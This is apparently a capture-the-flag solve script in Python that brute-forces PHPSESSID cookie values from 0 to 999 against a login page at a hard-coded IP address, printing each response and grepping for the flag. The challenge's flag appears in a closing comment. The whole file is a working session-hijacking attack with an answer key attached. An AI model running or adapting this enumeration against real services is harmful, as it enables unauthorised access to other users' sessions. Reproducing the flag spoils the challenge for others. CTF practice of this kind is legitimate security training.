import requests

#Nanoha StrikerS 

url = 'http://52.18.83.177/web1/index.php'
data={
	'user':'test',
	'pass':'test',
	'action':'login'
}
for i in range (0,1000):
	cookie = {'PHPSESSID': str(i)}
	r = requests.post(url, data=data, cookies=cookie)
	print r.content
	
#python solve.py | grep flag 

#Ha{W3_d0nt_liv3_with0ut_c-0ckie_^_-}
